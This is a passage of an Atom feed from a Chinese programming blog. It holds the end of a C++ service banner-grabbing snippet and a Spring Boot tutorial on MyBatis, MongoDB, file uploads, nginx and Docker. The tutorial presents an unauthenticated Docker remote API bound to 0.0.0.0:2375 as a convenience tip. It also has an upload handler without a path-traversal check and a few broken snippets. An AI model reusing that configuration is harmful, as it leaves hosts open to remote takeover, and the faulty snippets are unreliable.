class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Bytes received: %d\n"</span>, iResult);</span><br><span class="line">    printf_s(<span class="string">"recevied bytes: %s\n"</span>, recvbuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Connection closed\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"recv failed: %d\n"</span>, WSAGetLastError());</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (iResult &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>一开始是打算看一下nmap的banner script的源码写的，发现里面直接调用了一个banner函数，就没有继续深究下去了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网上有很多获取服务banner的文章，但大多数都是写的python代码，根据python代码用C++写了一份。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
      <category term="安全渗透" scheme="http://yoursite.com/categories/C/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C++" scheme="http://yoursite.com/tags/C/"/>
    
      <category term="安全渗透" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>使用spring boot开发Java web应用</title>
    <link href="http://yoursite.com/2019/10/19/java%20web%E5%BC%80%E5%8F%91%E5%8F%8A%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    <id>http://yoursite.com/2019/10/19/java web开发及安全设计/</id>
    <published>2019-10-19T02:33:23.268Z</published>
    <updated>2019-12-26T00:15:58.702Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址为：<a href="https://github.com/flowerlake/spring-blog-website" target="_blank" rel="noopener">https://github.com/flowerlake/spring-blog-website</a></p><ol><li>spring系列框架的理解</li><li>与前端交互的方式</li><li>后台如何接受并处理请求</li><li>spring boot的一些基本概念及项目框架的搭建</li><li>对orm框架：mybatis+mysql的理解及应用</li><li>如何在spring boot项目中集成nosql。例MongoDB</li><li>文件流的处理</li><li>使用docker部署项目</li><li>web设计安全及编码规范</li><li>具体编码过程中的一些细节</li><li>总结</li></ol><h3 id="spring-mvc框架及一些基本概念"><a href="#spring-mvc框架及一些基本概念" class="headerlink" title="spring mvc框架及一些基本概念"></a>spring mvc框架及一些基本概念</h3><p>Spring作为Java系的全栈(full-stack)开发框架，当然也对Web开发有着非常好的支持。Spring的Web MVC框架能够使开发者非常容易的开发Web应用，同时能够无缝享受到Spring本身的诸多好处——IoC容器、AOP编程等等。它对HTTP请求处理的模型如下图（图来自天码营）：<br><img src="http://assets.tianmaying.com/md-image/dbd1017dffce1d08e653d05baa1e4934.png" alt="Spring MVC请求处理流程"><br>上图中，web服务器接收到的请求会经过DispatcherServlet的分发，经过一系列的 interceptor 进行预处理，在这里数据的预处理顺序与interceptor的顺序有关，<br>之后，将请求交给controller进行处理，返回请求（response）时同样会经过一系列的 interceptor 进行后处理，这就是 interceptor 的预处理和后处理功能。<br>更多关于interceptor的内容查看 #interceptor。</p><p><strong>基本概念</strong></p><ul><li><p><strong>ORM（object relation mapping），顾名思义是 对象关系映射。</strong><br>ORM是一种以面向对象的方式来进行数据库操作的技术。Web开发中常用的语言，都会有对应的ORM框架。而MyBatis就是Java开发中一种常用ORM框架。<br>ORM框架：hibernate和mybatis；spring data jpa是 Spring Data的子模块 hibernate 作为ORM实现。<br>面向对象致力于解决计算机逻辑问题，而关系模型致力于解决数据的高效存取问题。</p></li><li><p><strong>IoC（Inversion of Control，控制反转）</strong><br>使用Spring的@Component标注将QunarBookingService注册进Spring的Context，这样它就可以被注入到需要它的地方！相应地，创建QunarBookingService实例的责任也交给了Spring。</p></li><li><p><strong>AOP（Aspect Oriented Programming，AOP）</strong><br>面向切面编程（Aspect Oriented Programming，AOP）其实就是一种关注点分离的技术，在软件工程领域一度是非常火的研究领域。<br>我们软件开发时经常提一个词叫做“业务逻辑”或者“业务功能”，我们的代码主要就是实现某种特定的业务逻辑。但是我们往往不能专注于业务逻辑，<br>比如我们写业务逻辑代码的同时，还要写事务管理、缓存、日志等等通用化的功能，而且每个业务功能都要和这些业务功能混在一起，痛苦！<br>所以，为了将业务功能的关注点和通用化功能的关注点分离开来，就出现了AOP技术。这些通用化功能的代码实现，对应的就是我们说的切面（Aspect）。</p></li></ul><h3 id="与前端交互的方式"><a href="#与前端交互的方式" class="headerlink" title="与前端交互的方式"></a>与前端交互的方式</h3><p>前端与后端的交互，本质上只有4种交互方式，即GET、POST、PUT、DELETE，一般来说仅涉及到GET、POST两种方式，剩下的就是前端的渲染。<br>对于前端渲染也有2种方式：一种是通过模板引擎对网页进行渲染，这种方式本质上是在服务端对网页进行渲染，即向事先写好的HTML模板中填充内容，然后将填充完的内容返回到前端页面；另一种方式就是通过ajax的方式进行数据请求，彻底将前后端分开，这种方式的处理方式是浏览器接收后台返回的原始HTML页面，在接收到页面请求的一瞬间就执行ajax部分的代码，ajax发出GET请求，得到数据，使用JavaScript（当然现在更方便的是使用jQuery）来对前端页面进行渲染。这两种方式各有优劣，但是在大公司里面前后端分工很细的情况下，大概率都会选择第2种方式进行设计。</p><p>基本的交互方式就不说了，网上有很多理解HTTP的文章，主要说一下前端渲染的方式：</p><p>1、模板引擎<br>在Java的开发web开发中，有很多模板引擎，比如大名鼎鼎的thymeleaf，模板之间没有什么特殊的差别，目前还没有碰到thymeleaf不能解决的渲染情况。<br>使用thymeleaf进行HTML的渲染，好处就是代码比较简单、开发比较便捷，缺点就是不符合前后端完全分离的思想，页面在服务端渲染加重了服务器的计算负担。</p><p>2、使用ajax进行请求渲染<br>这个需要在前端页面不少前端页面渲染的代码。</p><p><strong>注意：</strong>视频网站是怎样的处理方式，暂时还没有研究。</p><h3 id="后台如何接受并处理请求"><a href="#后台如何接受并处理请求" class="headerlink" title="后台如何接受并处理请求"></a>后台如何接受并处理请求</h3><p>首先服务器接收到tcp连接（HTTP）后，与服务器建立连接，服务器收到HTTP请求，将其转化为对应的端口如80端口，nginx监听80端口，将80端口的数据转发到对应的处理服务，即后台服务程序spring-blog-website的8080端口。该应用程序（spring boot）集成了Tomcat动态数据服务器，8080端口 收到nginx转发过来的请求后，实际上是转发给Tomcat服务器，然后Tomcat把请求转发给后台服务程序，后台服务程序根据controller处理对应的请求。</p><p>后台接收到请求后，都是在围绕着一件事在做——即对数据的处理。</p><p>对数据的处理虽然听上去很简单，但是这里面又涉及到很多附带的点，比如数据的校验、加密、基本处理等，然后就涉及到数据的增删改查以及数据的持久化，整个后台如何处理数据是核心。即网站设计时要考虑的很多方面也都是围绕着数据进行的，如数据结构的设计、什么类型的数据选择对应的数据库解决方案，比如本文中使用较多的文本类型的数据，那就可以选择MongoDB作为后台数据库。</p><p>后台应用程序干完上述的事情之后，就可以把从数据库中得到的数据进行一番操作之后返回给浏览器，浏览器接收到响应之后对数据页面进行渲染。</p><p><strong>nginx的配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://spring-blog-website:8080;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">        proxy_set_header X-Forwarded-Host $server_name;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        </span><br><span class="line">        client_max_body_size 100M;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        access_log   off;</span><br><span class="line">        expires      30d;</span><br><span class="line"></span><br><span class="line">        alias /spring-blog-website/static;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="spring-boot的一些基本概念及项目框架的搭建"><a href="#spring-boot的一些基本概念及项目框架的搭建" class="headerlink" title="spring boot的一些基本概念及项目框架的搭建"></a>spring boot的一些基本概念及项目框架的搭建</h3><p>新建一个项目的时候，第一要熟悉这个框架的结构，才能更好的梳理出整个项目的大致框架，等到建好这个项目的大框架之后，就可以丰富内部空间了。第一次接触spring的框架难免有些懵逼，不懂这个框架的结构是什么样的，现在来简单了解一下。在spring的官网首页上，有这么一张图 Spring Framework 5：<br><img src="https://spring.io/img/homepage/diagram-boot-reactor.svg" alt><br>在上图中，我们可以看到spring框架现在构建基石是spring boot2.0，然后在网站下有spring boot2.0的一些官方文档： </p><ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/" target="_blank" rel="noopener">Spring Boot Reference Manual</a></li><li><a href="https://spring.io/guides/gs/spring-boot/" target="_blank" rel="noopener">Getting Started Guide</a></li></ul><p>如果要新建一个spring boot的项目，主要有两种方式：</p><ul><li>一种是在本地IDEA中选择新建spring initialize项目，选择default，然后选择需要的组件</li><li>一种是通过spring提供的<a href="https://start.spring.io/" target="_blank" rel="noopener">https://start.spring.io/</a> 网站初始化项目所需要的组件。</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g8jxu7qxhaj31on0u0gs2.jpg" alt></p><p>新建完项目之后，得到一个基本的spring boot项目框架，项目文件夹resource下有一个application.properties(当然，可以有多个properties文件，通过在application.peoperties中定义使用其中某个配置文件，这一点可以用于本地开发和部署环境存在些许差异时方便的进行切换。)</p><p>除此之外，还需要进一步搭建web应用程序的框架。一般来说，在web项目中，通常要包括几个方面，controller层、service层、model层、dao层。</p><ul><li>controller层写class，写具体的流程控制，接收service层获得的数据，然后传递给前端页面。</li><li>service层写interface，写一些业务逻辑，不同于 mapper，mapper主要是写数据库操作的逻辑代码，service 主要写针对业务的一些从数据库的代码接口。</li><li>model层写Bean，设计每一块业务对应的数据项，并提供一些方法。</li><li>dao层写mybatis对应的一些mapper，即操作数据对象与sql语句进行对应，当然，也可以写nosql。</li></ul><p>最后，这个项目的基本框架就搭起来了，接下来就是向里面填东西了。本文设计的Java web不涉及传统的jsp开发，前端界面的渲染是通过ajax和模板引擎(thymeleaf)共同完成的。网上有很多文章还都是旧的技术，从jsp这些说起，感觉太落伍了，就琢磨出了这套开发模式。但是也要记住spring mvc也是在servelet基础上封装的，熟悉一下servelet的技术还是没有坏处的，但是jsp就不推荐了。</p><h3 id="对orm框架：mybatis-mysql的理解及应用"><a href="#对orm框架：mybatis-mysql的理解及应用" class="headerlink" title="对orm框架：mybatis+mysql的理解及应用"></a>对orm框架：mybatis+mysql的理解及应用</h3><p><strong>ORM（object relation mapping），顾名思义是 对象关系映射。</strong><br>ORM是一种以面向对象的方式来进行数据库操作的技术。Web开发中常用的语言，都会有对应的ORM框架。而MyBatis就是Java开发中一种常用ORM框架。现在开发中主流的ORM框架有hibernate和mybatis，而Spring data jpa是 Spring Data的子模块 hibernate 作为ORM实现。</p><p><strong>面向对象致力于解决计算机逻辑问题，而关系模型致力于解决数据的高效存取问题。</strong></p><p>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架，几乎避免了所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或标注，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。简单地理解，你可以认为MyBatis将SQL语句，以及SQL返回结果到Java对象的映射，都放到了一个易于配置的XML文件里了，你的Java代码就会变得异常简单。在xml文件中，通过定义mapper对象，可以把Mybatis的查询语句映射到SQL语句上。</p><p>当然，除了XML，MyBatis同时也支持基于标注的方式，但是功能上会有一些限制。总体来说，我们推荐使用XML方式，一些简单的SQL使用标注会更方便一些。</p><p>在spring boot项目中，整合Mybatis主要有以下两种方式：</p><ul><li><p>Mybatis提供的第一种映射方法：使用mapper进行映射。mapper接口，用来定义数据库的查询、增加、删除等操作;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.flowerlake.blogwebsite.dao.UserMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insert"</span> <span class="attr">parameterType</span>=<span class="string">"org.flowerlake.blogwebsite.model.User"</span>&gt;</span></span><br><span class="line">        INSERT INTO `t_user`(`username`, `password`) VALUES (#&#123;username&#125;, #&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Mybatis提供的第二种映射方法，直接在数据库操作类中使用@插入注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@(<span class="string">"SELECT * FROM t_user WHERE username = #&#123;username&#125;"</span>)</span><br><span class="line"><span class="function">List&lt;User&gt; <span class="title">findByUsername</span><span class="params">(@Param(<span class="string">"username"</span>)</span> String username)</span>;</span><br></pre></td></tr></table></figure></li></ul><p>以上两种方法都需要在接口类上加上@Mapper注解。</p><p><strong>使用spring-boot提供的application.properties文件将mybatis整合到spring-boot项目中</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/java_web?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true&amp;useSSL=false</span><br><span class="line">spring.datasource.username=username</span><br><span class="line">spring.datasource.password=password</span><br><span class="line"></span><br><span class="line">#这种方式需要自己在resources目录下创建mapper目录然后存放xml</span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*.xml</span><br><span class="line">mybatis.type-aliases-package=org.flowerlake.blogwebsite.model</span><br></pre></td></tr></table></figure><p><strong>使用orm框架能否有效控制SQL注入漏洞的产生呢？首先，我们要看一下mybatis的源码：</strong></p><h3 id="如何在spring-boot项目中集成nosql"><a href="#如何在spring-boot项目中集成nosql" class="headerlink" title="如何在spring boot项目中集成nosql"></a>如何在spring boot项目中集成nosql</h3><p>本文以MongoDB为例讲解spring boot继承nosql。MongoDB的和jpa有点类似，都是通过名称注解。在spring boot项目中集成MongoDB数据库，只需要以下几个步骤：</p><ol><li><p>在application.properties中添加MongoDB的连接信息，当然在实际项目中，要添加数据库用户信息(用户名+密码等)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.data.mongodb.uri=mongodb://localhost:27017/java_web</span><br></pre></td></tr></table></figure></li><li><p>定义数据结构，即model类，在类前加上@Document注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Document</span>(collection = <span class="string">"articles"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Article</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> ObjectId _id;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>定义一个增删改查的接口，提供增删改查方法的定义，该接口需要继承自MongoRepository。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ArticleRepository</span> <span class="keyword">extends</span> <span class="title">MongoRepository</span>&lt;<span class="title">Article</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">List&lt;Article&gt; <span class="title">findByAuthor</span><span class="params">(String author)</span></span>;</span><br><span class="line">    <span class="function">Article <span class="title">findByEnTitle</span><span class="params">(String enTitle)</span></span>;</span><br><span class="line">    <span class="function">Article <span class="title">findByTitle</span><span class="params">(String title)</span></span>;</span><br><span class="line">    <span class="function">Page&lt;Article&gt; <span class="title">findAll</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>写具体的服务逻辑，在service中新建service接口，然后实现它、当然直接写具体的服务类也是没有问题的，面对业务需求灵活改变即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleServiceImpl</span> <span class="keyword">implements</span> <span class="title">ArticleService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MongoTemplate mongoTemplate;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ArticleRepository articleRepository;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Article&gt; <span class="title">findByAuthor</span><span class="params">(String author)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> articleRepository.findByAuthor(author);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">updateArticle</span><span class="params">(Article article)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Query query = <span class="keyword">new</span> Query(<span class="keyword">new</span> Criteria(<span class="string">"id"</span>).is(article.getEnTitle()));</span><br><span class="line">            Update update = <span class="keyword">new</span> Update();</span><br><span class="line">            update.set(<span class="string">"author"</span>, article.getAuthor());</span><br><span class="line">            update.set(<span class="string">"enTitle"</span>, article.getEnTitle());</span><br><span class="line">            mongoTemplate.updateMulti(query, update, Article.class);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.info(<span class="string">"update article error: "</span> + e.toString());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>在Controller类中使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value = <span class="string">"/news/&#123;enTitle&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">displaySingleNews</span><span class="params">(@PathVariable(<span class="string">"enTitle"</span>)</span> String enTitle, Model model, HttpSession session) </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ArticleService articleService;</span><br><span class="line">        Article findArticle = articleService.findByEnTitle(enTitle);</span><br><span class="line">        model.addAttribute(<span class="string">"news"</span>, findArticle);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"news/singleArticle"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><p>注意在代码中使用了@Resource注解，要理解@Resource和@Autowired的区别：</p><ul><li>@Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入；</li><li>@Autowired默认是按照类型装配注入的，如果想按照名称来转配注入，则需要结合@Qualifier一起使用</li></ul><h3 id="文件流的处理"><a href="#文件流的处理" class="headerlink" title="文件流的处理"></a>文件流的处理</h3><p>文件流的处理涉及到前端上传的方式和后台的处理方式，后台一般通过MultipartFile类型来处理文件流，这里使用Files的copy操作，查看copy的源码，其实它也是通过读写stream二进制流完成文件的写操作的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">store</span><span class="params">(MultipartFile file)</span> </span>&#123;</span><br><span class="line">        String filename = StringUtils.cleanPath(file.getOriginalFilename());</span><br><span class="line">        <span class="keyword">try</span> (InputStream inputStream = file.getInputStream()) &#123;</span><br><span class="line">        Files.copy(inputStream, <span class="keyword">this</span>.rootLocation.resolve(filename),</span><br><span class="line">        StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.rootLocation.resolve(filename).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>Files.copy中调用的私有copy方法源码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">copy</span><span class="params">(InputStream source, OutputStream sink)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">long</span> nread = <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[BUFFER_SIZE];</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = source.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sink.write(buf, <span class="number">0</span>, n);</span><br><span class="line">            nread += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nread;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>读文件的操作也是一样的，这里再关注一下程序是怎么接收文件的请求的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"people/uploadNews"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> returnNewsStatus <span class="title">handleNewsUpload</span><span class="params">(MultipartHttpServletRequest httpServletRequest, HttpSession session)</span> </span>&#123;</span><br><span class="line">        String uploadFilePath = <span class="string">""</span>;</span><br><span class="line">        List&lt;MultipartFile&gt; fileList = httpServletRequest.getFiles(<span class="string">"file"</span>);</span><br><span class="line">        String title = httpServletRequest.getParameter(<span class="string">"newsTitle"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在上述代码中，我们使用MultipartHttpServletRequest类来接收请求的数据，这是为了处理包含了文件二进制流数据和正常文本数据的混合型请求（比如在发表文章时需要附带附件），而MultipartHttpServletRequest继承了HttpServletRequest, MultipartRequest类，这两个类可以分别处理二进制流数据和文本数据。</p><p>有时候有大文件上传的需求，只在application.properties中可以设置处理HTTP请求的大小限制，如下是把文件上传的限制改为50m大小。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.servlet.multipart.max-file-size=50MB</span><br><span class="line">spring.servlet.multipart.max-request-size=50MB</span><br></pre></td></tr></table></figure></p><p>踩坑经历：<br>之前文件下载是将其安排在resources的static目录下，这一安排的目的是使其作为静态资源，直接通过浏览器请求即可下载（如同对静态资源css、js这样的文件的处理），这种安排在开发环境是没有问题的，这是因为：静态资源只在项目启动的第一次进行加载，后续就不会实时加载改变的静态资源，但是在开发环境下，我们可以采用某些浏览器插件实现静态资源的实时更新。（参考 <a href="https://juejin.im/post/5d4cc6ac518825052c07e587" target="_blank" rel="noopener">https://juejin.im/post/5d4cc6ac518825052c07e587</a> ），但是在生产环境就不能这么做了，因为用户是不会主动安装浏览器插件的，因此这种方案要pass掉，就要采用处理正常get请求一样处理文件下载的请求数据，该模块在GetFileHandle下实现。</p><h4 id="使用docker部署项目"><a href="#使用docker部署项目" class="headerlink" title="使用docker部署项目"></a>使用docker部署项目</h4><p>将项目通过docker-compose部署后的一个小技巧：</p><p>一旦将服务器主机和docker容器的目录映射之后，两者的文件内容是同步的，如果要修改项目文件内容，其实只要修改主机上的即可，volume会直接同步到容器。使用IDEA的docker plugin使得这一方式更加方便。这样的话即使要修改代码，只需要将代码使用scp命令同步一下即可。</p><p>记录Ubuntu开启docker 远程访问API</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /lib/systemd/system/docker.service；</span><br><span class="line">// 找到ExecStart，</span><br><span class="line">ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H </span><br><span class="line">unix:///var/run/docker.sock；</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>有一个想法：在本地开发完之后，能否直接把spring boot项目、mysql数据库、MongoDB打包在一个容器里，这样对于小型项目的部署会更加方便，而且可以使一套系统随意分发。（这个可以参考另一篇文章：<a href>docker系列之使用docker-compose部署 Spring Boot 项目</a>）</p><h4 id="web设计安全及编码规范"><a href="#web设计安全及编码规范" class="headerlink" title="web设计安全及编码规范"></a>web设计安全及编码规范</h4><h4 id="具体编码过程中的一些细节"><a href="#具体编码过程中的一些细节" class="headerlink" title="具体编码过程中的一些细节"></a>具体编码过程中的一些细节</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当然，这些设计的内容，web开发的网站较为简单，内容交互和处理的方式还是比较简单，比如对于视频类的网站，该怎么处理，这里面涉及到二进制流数据的传输，视频传输一般都是建立在UDP的协议基础之上。还有对于淘宝这样的网站，后台的要求必然是非常之高的，主要是如何处理这么大的并发量，要考虑的细节问题之多超乎想象。<br>计算机领域有句话叫做：没有什么问题是一个中间件不能解决的，如果有，那就俩。因此面对各种需求问题，中间件的设计又处于一个非常重要的地位，比如阿里云举办的中间件大赛给中间件的设计提供了一个交流平台。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;项目地址为：&lt;a href=&quot;https://github.com/flowerlake/spring-blog-website&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/flowerlake/spring-blo
      
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="spring boot" scheme="http://yoursite.com/tags/spring-boot/"/>
    
  </entry>
  
  <entry>
    <title>大厂面试题目</title>
    <link href="http://yoursite.com/2019/09/01/%E5%A4%A7%E5%8E%82%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/09/01/大厂面试题目/</id>
    <published>2019-09-01T03:23:31.870Z</published>
    <updated>2019-11-03T05:24:39.224Z</updated>
    
